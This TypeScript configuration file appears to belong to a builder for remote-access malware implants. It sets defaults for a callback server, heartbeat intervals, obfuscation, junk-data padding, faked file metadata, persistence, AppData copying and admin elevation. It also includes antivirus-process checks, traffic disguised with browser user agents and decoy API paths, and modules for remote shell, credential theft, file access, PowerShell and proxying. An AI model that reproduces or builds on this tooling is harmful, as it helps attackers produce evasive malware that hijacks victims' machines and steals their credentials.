import type { BuildConfigRequest } from '../../types/models';

export interface ToggleOption {
  id: string;
  key: keyof BuildConfigRequest;
}

export interface AntiAnalysisToggle {
  id: string;
  key: keyof BuildConfigRequest['antiAnalysis'];
}

/** 心跳间隔快速预设（毫秒）。 */
export const HEARTBEAT_PRESETS: { ms: number; label: string }[] = [
  { ms: 3000, label: '3s' },
  { ms: 30000, label: '30s' },
  { ms: 60000, label: '60s' },
];

export const DEFAULT_CONFIG: BuildConfigRequest = {
  platform: 'x64',
  applicationType: 'Console',
  serverHost: '127.0.0.1',
  serverPort: 5270,
  enableObfuscation: false,
  injectJunkData: false,
  junkDataMb: 10,
  iconUrl: '',
  companyName: '',
  fileDescription: '',
  productName: '',
  copyright: '',
  fileVersion: '',
  stripSymbols: true,
  requireAdmin: false,
  copyToAppData: false,
  enablePersistence: false,
  antiAnalysis: {
    enabled: false,
    checkTestSigning: true,
    checkAvProcesses: true,
  },
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  ],
  extraHeaders: [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8',
    'X-Requested-With: XMLHttpRequest',
  ],
  pathSuffixes: [
    'user/info', 'orders/list', 'profile', 'settings',
    'notifications', 'messages/unread', 'search/history', 'dashboard/stats',
  ],
};

export const STATUS_LABEL: Record<string, string> = {
  building: 'builder.buildingStatus',
  completed: 'builder.completed',
  failed: 'builder.failed',
};

export const PLATFORM_LABEL: Record<string, string> = {
  x64: 'Win x64',
  x86: 'Win x86',
  'linux-x64': 'Linux x64',
};

export const APP_TYPE_LABEL: Record<string, string> = {
  Console: 'builder.consoleApp',
  Desktop: 'builder.desktopApp',
};

/** 云模块（与服务端 CloudModules 一致）：启用状态作为构建选项的子开关。 */
export const MODULE_OPTIONS: { id: string; labelKey: string }[] = [
  { id: 'shell', labelKey: 'builder.moduleShell' },
  { id: 'recon', labelKey: 'builder.moduleRecon' },
  { id: 'creds', labelKey: 'builder.moduleCreds' },
  { id: 'files', labelKey: 'builder.moduleFiles' },
  { id: 'powershell', labelKey: 'builder.modulePowershell' },
  { id: 'proxy', labelKey: 'builder.moduleProxy' },
  { id: 'script', labelKey: 'builder.moduleScript' },
];
